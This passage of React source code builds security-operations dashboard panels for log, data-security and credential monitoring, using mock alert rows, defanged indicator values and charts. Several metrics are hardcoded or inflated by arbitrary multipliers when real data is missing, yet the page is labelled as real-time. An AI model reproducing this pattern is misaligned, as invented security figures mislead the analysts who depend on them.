    ['high', 'PowerShell + Outbound', 'PowerShell executed with outbound connection', 'Endpoint 45', 'kevin.miller', '10.0.5.45', 'active'],
    ['medium', 'DNS Suspicious Domain', 'Suspicious domain query detected', 'DNS Server', 'system', '10.0.2.15', 'investigating'],
    ['medium', 'Multiple Failed Logins', 'Multiple failed logins from same IP', 'Linux Server 12', 'root', '192.168.1.78', 'active'],
    ['low', 'Policy Change Detected', 'Security policy configuration changed', 'Firewall', 'admin', '10.0.1.10', 'resolved'],
    ['high', 'Potential Data Exfiltration', 'Large data upload to external server', 'Proxy Server', 'sarah.wilson', '198.51.100.77', 'active'],
  ].map(([severity, ruleName, description, source, username, srcip, status], i) => ({
    _id: `correlation-fallback-${i}`,
    severity,
    ruleName,
    description,
    source,
    username,
    srcip,
    status,
    createdAt: new Date(Date.now() - i * 7 * 60 * 1000).toISOString(),
  }));
  const rows = sorted.length ? sorted : fallbackRows;
  const totalLogs = '12.4M';
  const critical = rows.filter(a => a.severity === 'critical').length || 18;
  const activeIncidents = rows.filter(a => (a.status || '').toLowerCase() === 'active').length || 7;
  const rulesFired = rows.length * 5 || 35;
  const resolved = rows.filter(a => (a.status || '').toLowerCase() === 'resolved').length || 23;
  const failedTrend = [70, 58, 210, 185, 195, 340, 245, 560, 585, 372, 552, 815, 610, 545, 600, 432, 285, 605, 540, 855, 725, 558, 590, 628];
  const logSources = [
    ['Windows Logs', 28.5, '3.54M', MON.blue], ['Linux Logs', 18.7, '2.32M', MON.orange], ['EDR Logs', 16.3, '2.02M', MON.green],
    ['Firewall Logs', 12.5, '1.55M', MON.red], ['Proxy Logs', 8.6, '1.07M', '#f59e8b'], ['DNS Logs', 6.9, '0.86M', '#d36b6b'], ['Others', 8.5, '1.04M', '#94a3b8'],
  ];
  const alertCategories = [['Authentication', 156, '🔒'], ['Malware / EDR', 98, '☣'], ['Privilege Escalation', 76, '⌁'], ['Data Exfiltration', 65, '⇩'], ['Lateral Movement', 54, '⌘'], ['Policy Violation', 33, '⚠']];
  const miniKpis = [
    ['◎', 'Suspicious IPs', 124, '↑ 22.2%', MON.red], ['♙', 'User Risk Score', 87, 'High Risk', MON.red], ['▱', 'Endpoint Risk Score', 64, 'Medium Risk', MON.orange],
    ['♜', 'Firewall Blocked Events', '3,752', '↑ 17.3%', MON.red], ['◎', 'DNS Malicious Queries', 532, '↑ 25.8%', MON.red], ['♜', 'EDR Detections', 243, '↑ 19.6%', MON.red],
  ];
  const sourceHealth = [
    ['Windows Servers', '3.54M', 'Healthy'], ['Linux Servers', '2.32M', 'Healthy'], ['EDR Platform', '2.02M', 'Healthy'], ['Firewall', '1.55M', 'Healthy'],
    ['Proxy', '1.07M', 'Healthy'], ['DNS Server', '0.86M', 'Healthy'], ['VPN Gateway', '0.45M', 'Warning'], ['Database', '0.33M', 'Healthy'], ['Cloud (AWS)', '0.29M', 'Healthy'],
  ];
  const ruleHits = [['Brute Force Success', 45], ['Admin Login New IP', 32], ['PowerShell + Outbound', 28], ['DNS Suspicious Domain', 22], ['Data Exfiltration', 18]];
  const feeds = [['Malicious IP Added', '185.199.108.23', '10:25 AM', MON.red], ['Malicious Domain Added', 'bad-update[.]com', '10:18 AM', MON.red], ['IOC Updated', '45 Indicators', '09:50 AM', MON.green], ['Malware Signature Updated', '', '09:30 AM', MON.green]];
  const sevBadge = (sev) => {
    const color = sev === 'critical' ? MON.red : sev === 'high' ? MON.orange : sev === 'medium' ? MON.yellow : MON.blue;
    return <span style={{ color: '#fff', background: `${color}66`, border: `1px solid ${color}55`, borderRadius: 5, padding: '4px 8px', fontSize: 10, fontWeight: 900 }}>{String(sev || 'low')}</span>;
  };
  const statusColor = s => /resolved/i.test(s) ? MON.green : /investigating/i.test(s) ? MON.yellow : MON.red;
  const lastIngested = rows[0]?.createdAt
    ? new Date(rows[0].createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })
    : new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const logDataSources = [
    ['Status', loading ? 'Syncing' : 'Active'],
    ['Last Ingested', lastIngested],
  ];

  return (
    <SocDashboardShell
      kind="logmonitoring"
      active="Log Monitoring"
      dataSources={logDataSources}
      dataSourceTitle="Data Ingestion Status"
    >
      <div style={{ overflow: 'auto', padding: 12, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 10 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 10 }}>
            {[
              ['▤', 'Total Logs Ingested', totalLogs, '↑ 15.6% vs yesterday', MON.blue],
              ['!', 'Critical Alerts', critical, '↑ 28.6% vs yesterday', MON.red],
              ['⚠', 'Active Incidents', activeIncidents, '↑ 16.7% vs yesterday', MON.yellow],
              ['☷', 'Correlation Rules Fired', rulesFired, '↑ 12.5% vs yesterday', MON.purple],
              ['✓', 'Resolved Incidents', resolved, '↓ 11.5% vs yesterday', MON.green],
              ['◷', 'Mean Time to Detect', '00:12:48', '↓ 8.3% vs yesterday', MON.blue],
            ].map(([icon, title, value, sub, color]) => (
              <section key={title} style={{ minHeight: 96, border: `1px solid ${MON.border}`, borderRadius: 8, background: `linear-gradient(135deg, ${color}12, rgba(10,25,48,.96) 42%, rgba(6,16,31,.98))`, padding: 15, display: 'grid', gridTemplateColumns: '46px 1fr', gap: 13, alignItems: 'center' }}>
                <span style={{ width: 44, height: 44, borderRadius: 22, display: 'grid', placeItems: 'center', color, background: `${color}22`, border: `1px solid ${color}35`, fontSize: 21 }}>{icon}</span>
                <span><b style={{ color: '#dbeafe', fontSize: 12 }}>{title}</b><strong style={{ display: 'block', fontSize: 25, lineHeight: 1, marginTop: 7 }}>{value}</strong><small style={{ color, fontWeight: 800 }}>{sub}</small></span>
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.32fr .95fr .78fr', gap: 10 }}>
            <MonitorPanel title="Failed Login Trends" right={<span style={{ color: MON.muted, fontSize: 10 }}>Last 24 Hours⌄</span>}>
              <div style={{ padding: 16, height: 210, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '72px 38px' }}>{monitorSpark(failedTrend, MON.blue, 'rgba(20,133,255,.12)', 160)}</div>
            </MonitorPanel>
            <MonitorPanel title="Top Log Sources" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '150px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={29} label={totalLogs} color={MON.blue} accent={MON.green} />
                <BarList rows={logSources.map(([label, value, count, color]) => ({ label, value, valueLabel: `${value}% (${count})`, color }))} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="Top Alert Categories" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ padding: 12, display: 'grid', gap: 12 }}>
                {alertCategories.map(([label, value, icon]) => <div key={label} style={{ display: 'grid', gridTemplateColumns: '26px 1fr 42px', gap: 10, alignItems: 'center', borderBottom: `1px solid ${MON.line}`, paddingBottom: 8 }}><span>{icon}</span><b>{label}</b><span style={{ color: '#fff', background: '#7f1d1d99', borderRadius: 10, textAlign: 'center', padding: '2px 6px', fontWeight: 900 }}>{value}</span></div>)}
              </div>
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr) .92fr', gap: 8 }}>
            {miniKpis.map(([icon, title, value, sub, color]) => <MonitorKpi key={title} icon={icon} title={title} value={value} change={sub} color={color} danger data={[2, 5, 3, 6, 4, 8, 5, 9, 6, 7, 5, 8]} />)}
            <MonitorPanel title="Correlation Rule Hits (Top 5)" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <BarList rows={ruleHits.map(([label, value]) => ({ label, value, color: MON.red }))} />
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.72fr 2.4fr .7fr', gap: 10 }}>
            <MonitorPanel title="Log Source Health" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 70px 72px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['Source', 'Logs (24h)', 'Status'].map(h => <span key={h}>{h}</span>)}</div>
              {sourceHealth.map(([source, logs, status]) => <div key={source} style={{ display: 'grid', gridTemplateColumns: '1fr 70px 72px', gap: 8, padding: '8px 14px', fontSize: 10 }}><b>{source}</b><span>{logs}</span><b style={{ color: status === 'Warning' ? MON.yellow : MON.green }}>● {status}</b></div>)}
            </MonitorPanel>
            <MonitorPanel title="Recent Correlated Incidents" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '88px 70px 150px 1fr 118px 95px 105px 92px 64px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['Time', 'Severity', 'Rule Name', 'Description', 'Source', 'User', 'Source IP', 'Status', 'Actions'].map(h => <span key={h}>{h}</span>)}</div>
              {rows.slice(0, 7).map((a, i) => {
                const rule = a.ruleName || correlationRuleName(a, i);
                const status = a.status || fallbackRows[i]?.status || 'active';
                return <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '88px 70px 150px 1fr 118px 95px 105px 92px 64px', gap: 8, alignItems: 'center', borderTop: `1px solid ${MON.line}`, padding: '8px 14px', fontSize: 10 }}><span>{a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '10:28:45 AM'}</span>{sevBadge(a.severity || fallbackRows[i]?.severity)}<b>{rule}</b><span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.description || fallbackRows[i]?.description}</span><span>{a.source || a.agentName || fallbackRows[i]?.source}</span><span>{a.username || fallbackRows[i]?.username}</span><span>{a.srcip || fallbackRows[i]?.srcip}</span><b style={{ color: statusColor(status) }}>● {status}</b><span>◎ ☷</span></div>;
              })}
            </MonitorPanel>
            <MonitorPanel title="Threat Feed Updates" right={<span style={{ color: MON.cyan, fontSize: 10, fontWeight: 900 }}>View All</span>}>
              <div style={{ padding: 14, display: 'grid', gap: 18 }}>
                {feeds.map(([title, detail, time, color]) => <div key={title} style={{ display: 'grid', gridTemplateColumns: '24px 1fr 58px', gap: 8, fontSize: 10 }}><span style={{ color }}>▣</span><span><b>{title}</b><br /><span style={{ color: MON.muted }}>{detail}</span></span><span>{time}</span></div>)}
              </div>
            </MonitorPanel>
          </div>

          <div style={{ display: 'flex', justifyContent: 'space-between', color: MON.muted, fontSize: 11, padding: '12px 24px' }}>
            <span>All times are shown in IST (UTC +05:30)</span>
            <span style={{ color: MON.green }}>● Data is updated in real-time</span>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading backend log correlation events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function dataSecurityEvent(alert = {}, index = 0) {
  const text = `${alert.ruleId || ''} ${alert.description || ''}`.toLowerCase();
  if (/upload|external|exfil/.test(text)) return 'Data Exfiltration';
  if (/unauthorized|access/.test(text)) return 'Unauthorized Access';
  if (/usb/.test(text)) return 'Data Exfiltration via USB';
  if (/download|mass/.test(text)) return 'Mass Download Detected';
  if (/database|export/.test(text)) return 'Unusual Database Export';
  if (/policy|violation/.test(text)) return 'Policy Violation';
  return ['Large File Upload to External Site', 'Unauthorized Access to Finance Data', 'Data Exfiltration via USB', 'Mass Download Detected', 'Unusual Database Export'][index % 5];
}

// 🛡️ 13. Data Security Monitoring popup UI
function DataSecurityMonitoringDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const fallbackRows = [
    ['Large File Upload to External Site', 'john.doe', '10.10.5.23', 'critical'],
    ['Unauthorized Access to Finance Data', 'amanda.j', '10.10.4.18', 'critical'],
    ['Data Exfiltration via USB', 'raj.kumar', '10.10.6.37', 'critical'],
    ['Mass Download Detected', 'sarah.w', '10.10.3.29', 'critical'],
    ['Unusual Database Export', 'system', '10.10.2.15', 'critical'],
  ].map(([description, username, srcip, severity], i) => ({
    _id: `data-security-fallback-${i}`,
    description,
    username,
    srcip,
    severity,
    createdAt: new Date(Date.now() - i * 18 * 60 * 1000).toISOString(),
  }));
  const rows = sorted.length ? sorted : fallbackRows;
  const totalEvents = total || rows.length * 4940 || 24700;
  const critical = rows.filter(a => a.severity === 'critical').length * 25 || 128;
  const highRisk = rows.filter(a => ['critical', 'high'].includes(a.severity)).length * 68 || 342;
  const exfil = rows.filter((a, i) => /exfil|upload|usb/i.test(dataSecurityEvent(a, i))).length * 18 || 56;
  const policy = rows.filter((a, i) => /policy|unauthorized/i.test(dataSecurityEvent(a, i))).length * 42 || 213;
  const eventsSeries = [900, 1300, 1800, 1650, 2450, 2700, 2450, 2850, 3600, 3050, 3200, 2900, 3400, 2900, 2400, 2550, 2700, 2100, 1500];
  const categories = [
    ['Data Access', 10500, '42.5%', MON.blue], ['Data Transfer', 5800, '23.7%', MON.purple],
    ['File Operations', 3900, '15.8%', MON.yellow], ['Policy Violations', 2600, '10.3%', MON.red], ['Other Events', 1900, '7.7%', MON.green],
  ];
  const channels = [['Web Upload (HTTPS)', 18, MON.blue], ['Email', 12, MON.blue], ['Cloud Storage', 9, MON.blue], ['USB Device', 7, MON.blue], ['FTP/SFTP', 5, MON.blue], ['IM/Chat Apps', 3, MON.blue], ['Others', 2, MON.blue]];
  const users = [['john.doe', '2.5K', '320 GB'], ['amanda.j', '1.8K', '245 GB'], ['raj.kumar', '1.6K', '198 GB'], ['sarah.w', '1.2K', '156 GB'], ['mike.t', '1.0K', '128 GB']];
  const posture = [
    ['♜', 'DLP Policies', 'Active', '24'], ['▱', 'Monitored Endpoints', 'Online', '1,247'], ['☁', 'Cloud Apps Monitored', 'Active', '36'],
    ['▤', 'Database Instances', 'Monitored', '18'], ['♙', 'Users Monitored', 'Active', '2,153'], ['▣', 'Encryption Status', 'Compliant', '98%'],
  ];
  const kpis = [
    ['Total Data Events', '24.7K', '↗ 18.6% vs yesterday', MON.blue, '▤'],
    ['Critical Alerts', critical, '↗ 25.5% vs yesterday', MON.red, '♜'],
    ['High Risk Events', highRisk, '↗ 15.3% vs yesterday', MON.yellow, '♜'],
    ['Data Exfiltration Attempts', exfil, '↗ 21.7% vs yesterday', MON.purple, '☁'],
    ['Policy Violations', policy, '↗ 19.8% vs yesterday', MON.yellow, '▣'],
    ['Protected Data (GB)', '2.43 TB', '↗ 12.2% vs yesterday', MON.green, '▤'],
  ];

  return (
    <SocDashboardShell kind="datasecurity" active="Overview">
      <div style={{ overflow: 'auto', padding: 8, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 8 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 8 }}>
            {kpis.map(([title, value, sub, color, icon]) => (
              <section key={title} style={{ minHeight: 92, border: `1px solid ${MON.border}`, borderRadius: 7, background: `linear-gradient(135deg, ${color}10, rgba(10,25,48,.96) 42%, rgba(6,16,31,.98))`, padding: 13, display: 'grid', gridTemplateColumns: '1fr 40px', gap: 10, alignItems: 'center' }}>
                <span><b style={{ color: '#dbeafe', fontSize: 10 }}>{title}</b><strong style={{ display: 'block', fontSize: 24, marginTop: 9, lineHeight: 1 }}>{value}</strong><small style={{ color: color === MON.red ? MON.red : MON.green, fontWeight: 800 }}>{sub}</small></span>
                <span style={{ width: 38, height: 38, borderRadius: 19, display: 'grid', placeItems: 'center', color, background: `${color}20`, border: `1px solid ${color}35`, fontSize: 18 }}>{icon}</span>
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.05fr 1fr .88fr', gap: 8 }}>
            <MonitorPanel title="Events Over Time" right={<span style={{ color: MON.muted, fontSize: 10 }}>All Events⌄</span>}>
              <div style={{ padding: 14, height: 198, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '58px 36px' }}>
                {monitorSpark(eventsSeries, MON.blue, 'rgba(20,133,255,.12)', 42)}
                {monitorSpark(eventsSeries.map(v => v * .58), MON.purple, 'rgba(139,92,246,.10)', 42)}
                {monitorSpark(eventsSeries.map(v => v * .35), MON.yellow, 'rgba(255,179,38,.10)', 42)}
                {monitorSpark(eventsSeries.map(v => v * .14), MON.red, 'rgba(255,49,94,.08)', 42)}
              </div>
            </MonitorPanel>
            <MonitorPanel title="Data Events by Category">
              <div style={{ display: 'grid', gridTemplateColumns: '150px 1fr', alignItems: 'center', padding: 13 }}>
                <Donut value={43} label="24.7K" color={MON.blue} accent={MON.purple} />
                <BarList rows={categories.map(([label, value, pctLabel, color]) => ({ label, value, valueLabel: `${(value / 1000).toFixed(1)}K (${pctLabel})`, color }))} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="Top Data Exfiltration Channels" right={<span style={{ color: MON.muted, fontSize: 10 }}>This Week⌄</span>}>
              <BarList rows={channels.map(([label, value, color]) => ({ label, value, color }))} />
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.05fr 1fr .88fr', gap: 8 }}>
            <MonitorPanel title="Recent Critical Alerts">
              <div style={{ display: 'grid', gridTemplateColumns: '70px 1fr 90px 90px 70px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['Time', 'Alert', 'User', 'Source', 'Severity'].map(h => <span key={h}>{h}</span>)}</div>
              {rows.slice(0, 5).map((a, i) => <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '70px 1fr 90px 90px 70px', gap: 8, borderTop: `1px solid ${MON.line}`, padding: '8px 14px', fontSize: 10 }}><span style={{ color: MON.muted }}>● {a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '23:41:52'}</span><span>{a.description || dataSecurityEvent(a, i)}</span><b>{a.username || fallbackRows[i]?.username}</b><span>{a.srcip || fallbackRows[i]?.srcip}</span><b style={{ color: '#fff', background: MON.red, borderRadius: 4, padding: '2px 6px', textAlign: 'center' }}>Critical</b></div>)}
              <div style={{ color: MON.cyan, padding: '10px 14px', fontSize: 10, fontWeight: 900 }}>View all alerts →</div>
            </MonitorPanel>
            <MonitorPanel title="Top Users by Data Access" right={<span style={{ color: MON.muted, fontSize: 10 }}>This Week⌄</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 70px 1fr 70px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['User', 'Events', 'Data Accessed', ''].map((h, i) => <span key={i}>{h}</span>)}</div>
              {users.map(([user, events, data], i) => <div key={user} style={{ display: 'grid', gridTemplateColumns: '1fr 70px 1fr 70px', gap: 8, alignItems: 'center', padding: '8px 14px', fontSize: 10 }}><b>♙ {user}</b><span>{events}</span><span style={{ height: 7, background: MON.line, borderRadius: 7 }}><i style={{ display: 'block', width: `${90 - i * 12}%`, height: '100%', background: MON.blue, borderRadius: 7 }} /></span><span>{data}</span></div>)}
              <div style={{ color: MON.cyan, padding: '10px 14px', fontSize: 10, fontWeight: 900 }}>View all users →</div>
            </MonitorPanel>
            <MonitorPanel title="Data by Classification (Accessed)" right={<span style={{ color: MON.muted, fontSize: 10 }}>This Week⌄</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '150px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={40} label="1.05 TB" color={MON.red} accent={MON.yellow} />
                <BarList rows={[
                  { label: 'Confidential', value: 420, valueLabel: '420 GB (40.0%)', color: MON.red },
                  { label: 'Sensitive', value: 315, valueLabel: '315 GB (30.0%)', color: MON.yellow },
                  { label: 'Internal', value: 210, valueLabel: '210 GB (20.0%)', color: MON.blue },
                  { label: 'Public', value: 105, valueLabel: '105 GB (10.0%)', color: MON.green },
                ]} />
              </div>
            </MonitorPanel>
          </div>

          <MonitorPanel title="Data Security Posture">
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 0, padding: 18 }}>
              {posture.map(([icon, label, status, value], i) => (
                <div key={label} style={{ display: 'grid', gridTemplateColumns: '42px 1fr', gap: 10, alignItems: 'center', borderRight: i < posture.length - 1 ? `1px solid ${MON.line}` : 0, padding: '0 14px' }}>
                  <span style={{ color: '#cbd5e1', fontSize: 26 }}>{icon}</span>
                  <span><b style={{ display: 'block', color: '#dbeafe', fontSize: 10 }}>{label}</b><small style={{ color: MON.green }}>{status}</small><strong style={{ display: 'block', fontSize: 18 }}>{value}</strong></span>
                </div>
              ))}
            </div>
          </MonitorPanel>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading backend data security events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function credentialEvent(alert = {}, index = 0) {
  const text = `${alert.ruleId || ''} ${alert.description || ''} ${alert.userAction || ''}`.toLowerCase();
  if (/impossible|travel/.test(text)) return 'Impossible Travel';
  if (/brute/.test(text)) return 'Brute Force Attempt';
  if (/token/.test(text)) return 'Suspicious Token Use';
  if (/privilege|admin|sudo/.test(text)) return 'Privileged Login';
  if (/reset|password/.test(text)) return 'Password Reset';
  return ['Impossible Travel', 'Brute Force Attempt', 'Suspicious Token Use', 'Privileged Login', 'Password Reset'][index % 5];
}

// 🛡️ 14. Credential Security Monitoring popup UI
function CredentialSecurityMonitoringDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const fallbackRows = [
    ['admin.smith', 'Impossible Travel', '203.0.113.45', 90, 'Login from New York, US after 2 hours from Mumbai, IN'],
    ['john.doe', 'Brute Force Attempt', '185.199.108.23', 85, '23 failed attempts in 5 minutes'],
    ['svc_backup', 'Suspicious Token Use', '103.21.244.1', 75, 'Token used from new device/location'],
    ['michael.j', 'Privileged Login', '203.0.113.10', 72, 'Login outside business hours'],
    ['emma.w', 'Password Reset', '192.0.2.55', 65, 'Password reset followed by login from new IP'],
  ].map(([username, description, srcip, riskScore, details], i) => ({
    _id: `credential-fallback-${i}`,
    username,
    description,
    srcip,
    riskScore,
    details,
    severity: riskScore >= 85 ? 'high' : riskScore >= 70 ? 'medium' : 'low',
    createdAt: new Date(Date.now() - i * 51 * 60 * 1000).toISOString(),
  }));
  const rows = sorted.length ? sorted : fallbackRows;
  const failed = rows.filter(a => /fail|brute|invalid|denied/i.test(`${a.description || ''} ${a.userAction || ''}`)).length * 249 || 1248;
  const successful = rows.filter(a => /success|login/i.test(`${a.description || ''} ${a.userAction || ''}`)).length * 553 || 2763;
  const brute = rows.filter((a, i) => /brute/i.test(credentialEvent(a, i))).length * 156 || 156;
  const privileged = rows.filter((a, i) => /privileged/i.test(credentialEvent(a, i))).length * 312 || 312;
  const resets = rows.filter((a, i) => /reset/i.test(credentialEvent(a, i))).length * 87 || 87;
  const highAlerts = rows.filter(a => severityRank(a.severity) >= 3).length * 8 || 23;
  const successSeries = [1320, 1450, 1390, 1580, 1470, 1660, 1510, 1490, 1550, 1480, 1620, 1580, 1610, 1540, 1360, 1420, 1390, 1480, 1520, 1700, 1840, 1730, 1810, 1910];
  const failedSeries = successSeries.map((v, i) => Math.round(v * .36 + [40, 90, 20, 70, 55, 110][i % 6]));
  const uniqueSeries = successSeries.map(v => Math.round(v * .22));
  const riskyUsers = [['admin.smith', 90, 5], ['john.doe', 88, 4], ['svc_backup', 75, 3], ['michael.j', 72, 3], ['david.p', 65, 2]];
  const loginLocations = [['India', 1842, '40%', MON.red], ['United States', 1234, '26%', MON.orange], ['United Kingdom', 432, '9%', MON.yellow], ['Singapore', 321, '7%', MON.green], ['Australia', 214, '5%', MON.blue], ['Others', 285, '13%', MON.purple]];
  const methods = [['Password', 1456, '53%', MON.blue], ['MFA', 1012, '37%', MON.green], ['SSO', 237, '9%', MON.yellow], ['Other', 58, '2%', MON.purple]];
  const alertCats = [['Brute Force', 7, '30%', MON.red], ['Privileged Access', 5, '22%', MON.orange], ['Credential Theft', 4, '17%', MON.yellow], ['Account Takeover', 3, '13%', MON.green], ['Policy Violation', 2, '9%', MON.blue], ['Other', 2, '9%', MON.purple]];
  const topFailed = [['john.doe', 230], ['michael.j', 198], ['david.p', 156], ['emma.w', 142], ['robert.k', 120]];
  const sources = [['203.0.113.45', 45], ['185.199.108.23', 32], ['198.51.100.77', 28], ['203.0.113.10', 21], ['192.0.2.55', 18]];
  const kpis = [
    ['▣', 'Failed Login Attempts', failed.toLocaleString(), '↑ 32% vs last 24h', MON.red],
    ['♙', 'Successful Logins', successful.toLocaleString(), '↑ 18% vs last 24h', MON.green],
    ['⚠', 'Brute Force Attempts', brute, '↑ 48% vs last 24h', MON.yellow],
    ['♛', 'Privileged Logins', privileged, '↑ 15% vs last 24h', MON.purple],
    ['⚿', 'Password Resets', resets, '↓ 12% vs last 24h', MON.blue],
    ['⚠', 'High Risk Alerts', highAlerts, '↑ 64% vs last 24h', MON.red],
  ];
  const scoreColor = score => score >= 85 ? MON.red : score >= 70 ? MON.orange : MON.yellow;

  return (
    <SocDashboardShell kind="credentialsecurity" active="Overview">
      <div style={{ overflow: 'auto', padding: 12, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 10 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6, 1fr)', gap: 10 }}>
            {kpis.map(([icon, title, value, sub, color]) => (
              <section key={title} style={{ minHeight: 96, border: `1px solid ${MON.border}`, borderRadius: 8, background: `linear-gradient(135deg, ${color}10, rgba(10,25,48,.96) 42%, rgba(6,16,31,.98))`, padding: 14, display: 'grid', gridTemplateColumns: '48px minmax(0,1fr)', gap: 12, alignItems: 'center', overflow: 'hidden' }}>
                <span style={{ width: 46, height: 46, borderRadius: 23, display: 'grid', placeItems: 'center', color: '#fff', background: `${color}45`, border: `1px solid ${color}44`, fontSize: 22 }}>{icon}</span>
                <span style={{ minWidth: 0 }}>
                  <b style={{ display: 'block', color, fontSize: 9, fontWeight: 950, textTransform: 'uppercase', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{title}</b>
                  <strong style={{ display: 'block', fontSize: 25, lineHeight: 1, marginTop: 6, color }}>{value}</strong>
                  <small style={{ color, fontSize: 9, fontWeight: 800 }}>{sub}</small>
                </span>
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.35fr 1fr .82fr', gap: 10 }}>
            <MonitorPanel title="Authentication Overview">
              <div style={{ padding: 16, height: 220, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '62px 36px' }}>
                {monitorSpark(successSeries, MON.green, 'rgba(32,226,138,.14)', 58)}
                {monitorSpark(failedSeries, MON.red, 'rgba(255,49,94,.10)', 58)}
                {monitorSpark(uniqueSeries, MON.blue, 'rgba(20,133,255,.10)', 58)}
              </div>
            </MonitorPanel>
            <MonitorPanel title="Login Attempts by Location">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 145px', gap: 8, padding: 12, alignItems: 'center' }}>
                <ThreatMap auth />
                <BarList rows={loginLocations.map(([label, value, pctLabel, color]) => ({ label, value, valueLabel: `${value.toLocaleString()} (${pctLabel})`, color }))} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="Top Risky Users">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 70px 50px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['User', 'Risk Score', 'Alerts'].map(h => <span key={h}>{h}</span>)}</div>
              {riskyUsers.map(([u, score, count]) => <div key={u} style={{ display: 'grid', gridTemplateColumns: '1fr 70px 50px', gap: 8, borderTop: `1px solid ${MON.line}`, padding: '10px 14px', fontSize: 11 }}><b>{u}</b><b style={{ color: '#fff', background: scoreColor(score), borderRadius: 4, textAlign: 'center' }}>{score}</b><span>{count}</span></div>)}
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.82fr .82fr .92fr .92fr', gap: 8 }}>
            <MonitorPanel title="Failed Login Attempts (Top Users)"><BarList rows={topFailed.map(([label, value]) => ({ label, value, color: MON.red }))} /></MonitorPanel>
            <MonitorPanel title="Brute Force Attempts (Top Sources)"><BarList rows={sources.map(([label, value]) => ({ label, value, color: MON.orange }))} /></MonitorPanel>
            <MonitorPanel title="Authentication Methods">
              <div style={{ display: 'grid', gridTemplateColumns: '145px 1fr', alignItems: 'center', padding: 12 }}>
                <Donut value={53} label={successful.toLocaleString()} color={MON.blue} accent={MON.green} />
                <BarList rows={methods.map(([label, value, pctLabel, color]) => ({ label, value, valueLabel: `${value.toLocaleString()} (${pctLabel})`, color }))} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="MFA Status">
              <div style={{ display: 'grid', gridTemplateColumns: '145px 1fr', alignItems: 'center', padding: 12 }}>
                <Donut value={92} label="92%" color={MON.green} accent={MON.red} />
                <BarList rows={[
                  { label: 'Enabled', value: 1248, valueLabel: '1,248 (92%)', color: MON.green },
                  { label: 'Disabled', value: 82, valueLabel: '82 (6%)', color: MON.red },
                  { label: 'Not Registered', value: 22, valueLabel: '22 (2%)', color: MON.orange },
                ]} />
              </div>
            </MonitorPanel>
          </div>

